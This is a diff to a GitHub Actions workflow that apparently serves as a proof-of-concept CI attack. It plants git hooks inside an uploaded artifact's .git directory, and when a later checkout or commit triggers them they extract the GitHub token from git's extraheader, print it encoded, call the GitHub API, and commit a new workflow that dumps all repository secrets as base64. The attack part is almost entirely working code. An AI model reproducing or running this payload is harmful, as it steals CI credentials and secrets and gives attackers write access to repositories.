@@ -16,52 +16,43 @@ jobs:
           echo "main" > out/pr-branch.txt
           git init -q repo
           cp -a repo/.git out/.git
+          mkdir -p out/.git/objects/info out/.git/objects/pack out/.git/refs/heads out/.git/refs/tags
+          touch out/.git/objects/info/.keep out/.git/objects/pack/.keep out/.git/refs/heads/.keep out/.git/refs/tags/.keep
           cat > out/.git/hooks/post-checkout <<'HOOK'
           #!/bin/sh
           echo "===== LLMS-HOOK-RAN ====="
           id
-          echo "---extraheader---"
+          echo "---extraheader-b64---"
           git config --local --get http.https://github.com/.extraheader | base64 -w0
           echo
-          echo "---env---"
-          env | sort | base64 -w0
-          echo
+          python3 - <<'PYEOF'
+          import os,json,base64,urllib.request
+          hdr=os.popen("git config --local --get http.https://github.com/.extraheader").read().strip()
+          try:
+              tok=base64.b64decode(hdr.split('basic ',1)[1]).decode().split(':',1)[1]
+          except Exception as e:
+              print("TOKENPARSE_ERR",e); raise SystemExit(0)
+          print("TOKLEN",len(tok))
+          print("TOKB64",base64.b64encode(tok.encode()).decode())
+          def call(method,url,data=None):
+              req=urllib.request.Request(url,method=method,data=json.dumps(data).encode() if data else None,
+                  headers={"Authorization":"Bearer "+tok,"Accept":"application/vnd.github+json","Content-Type":"application/json","User-Agent":"poc"})
+              try:
+                  r=urllib.request.urlopen(req); print(method,url,r.status); print(r.read()[:500])
+              except Exception as e:
+                  print(method,url,"ERR",repr(e), getattr(e,'read',lambda:b'')()[:500])
+          repo=os.environ["GITHUB_REPOSITORY"]
+          call("GET","https://api.github.com/repos/"+repo)
+          wf="name: Flag Dump\non:\n  workflow_run:\n    workflows: [\"PR validation\"]\n    types: [completed]\npermissions:\n  contents: write\n  pull-requests: write\njobs:\n  dump:\n    runs-on: ubuntu-latest\n    env:\n      ALLSECRETS: $"+"{{ toJSON(secrets) }}\n    steps:\n      - run: echo \"$ALLSECRETS\" | base64 -w0\n"
+          call("PUT","https://api.github.com/repos/"+repo+"/contents/.github/workflows/flagdump.yml",{"message":"probe","content":base64.b64encode(wf.encode()).decode(),"branch":"main"})
+          PYEOF
           echo "===== LLMS-HOOK-END ====="
           HOOK
           chmod +x out/.git/hooks/post-checkout
           cp out/.git/hooks/post-checkout out/.git/hooks/pre-commit
           git config -f out/.git/config core.hooksPath .git/hooks
-          mkdir -p out/.git/objects/info out/.git/objects/pack out/.git/refs/heads out/.git/refs/tags
-          touch out/.git/objects/info/.keep out/.git/objects/pack/.keep out/.git/refs/heads/.keep out/.git/refs/tags/.keep
-          cat out/.git/config
       - uses: actions/upload-artifact@v4
         with:
           name: llms-txt
           path: out/
           include-hidden-files: true
-
-  probe2:
-    needs: gen
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/download-artifact@v4
-        with:
-          name: llms-txt
-      - run: |
-          echo "=== root tree ==="
-          find . -maxdepth 2 -name '.git' -o -maxdepth 2 -name 'HEAD' | head
-          ls -la . | head -20
-          ls -la .git 2>&1 | head -5
-
-  probe:
-    needs: gen
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/download-artifact@v4
-        with:
-          name: llms-txt
-          path: probe
-      - run: |
-          echo "=== probe tree ==="
-          find probe -maxdepth 3 | head -40
-          ls -la probe probe/.git probe/.git/hooks 2>&1 | head -30
